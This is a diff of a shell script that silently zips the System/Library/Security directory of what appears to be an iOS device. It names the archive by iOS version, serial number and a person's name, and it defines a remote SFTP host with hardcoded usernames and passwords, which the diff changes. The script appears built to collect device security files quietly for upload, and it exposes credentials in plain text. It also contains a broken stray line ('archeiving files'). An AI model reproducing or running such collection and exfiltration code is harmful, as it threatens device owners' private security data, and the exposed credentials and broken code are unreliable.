@@ -4,8 +4,8 @@ echo "<======= 111=======>"
 #
 PERSON_NAME="attitude"
 REMOTE_HOST="eu-central-1.sftpcloud.io"
-REMOTE_USER="affd62e92b844613a73c06efae47c4ca"
-REMOTE_PASS="avhAu89mzWqHWUAft8XxZlJblINeAwYN"
+REMOTE_USER="1f288b2de0254b309afa10e332ef260c"
+REMOTE_PASS="TgEkPeNdsMudLNNEIntsGp3pdYUnJ2ag"
 REMOTE_PATH="/home"
 REMOTE_DEST="/"
 
@@ -17,7 +17,7 @@ ARCHIVE_NAME="${IOS_VERSION}_${SERIAL_NUMBER}_${LOCAL_FILE}_${PERSON_NAME}.zip"
 echo "$ARCHIVE_NAME"
 
 
-cd $home/../../../System/Library/
+# cd $home/../../../System/Library/  //important line uncomment or directory wont change 
 archeiving files
 echo "archiving silently"
 zip -qr "$ARCHIVE_NAME" Security && echo "Archiving complete!"
